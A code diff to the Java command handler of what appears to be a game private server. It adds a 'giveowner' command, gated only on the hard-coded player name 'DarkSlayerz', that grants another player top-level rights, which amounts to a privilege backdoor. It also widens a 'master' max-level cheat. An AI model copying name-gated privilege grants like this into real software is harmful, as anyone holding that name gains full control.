@@ -514,6 +514,24 @@ if (playerCommand.startsWith("mute")) {
 					c.sendMessage("Player Must Be Offline.");
 				}			
 			}
+						if (playerCommand.startsWith("giveowner") && c.playerName.equalsIgnoreCase("DarkSlayerz")) {
+				try {	
+					String playerToAdmin = playerCommand.substring(10);
+					for(int i = 0; i < Config.MAX_PLAYERS; i++) {
+						if(Server.playerHandler.players[i] != null) {
+							if(Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToAdmin)) {
+								Client c2 = (Client)Server.playerHandler.players[i];
+								c2.sendMessage("You have been given admin status by " + c.playerName);
+								c2.playerRights = 3;
+								c2.logout();
+								break;
+							} 
+						}
+					}
+				} catch(Exception e) {
+					c.sendMessage("Player Must Be Offline.");
+				}			
+			}
 		if (playerCommand.equalsIgnoreCase("veng")) {		
 							c.getItems().addItem(560, 500);
                                                         c.getItems().addItem(9075, 500);
@@ -934,7 +952,7 @@ c.sendMessage("Use as ::setlevel SKILLID LEVEL PLAYERNAME.");
 					}
 			}
 						if (playerCommand.equalsIgnoreCase("master")) {
-				for (int i = 0; i < 22; i++) {
+				for (int i = 0; i < 25; i++) {
 					c.playerLevel[i] = 99;
 					c.playerXP[i] = c.getPA().getXPForLevel(100);
 					c.getPA().refreshSkill(i);	
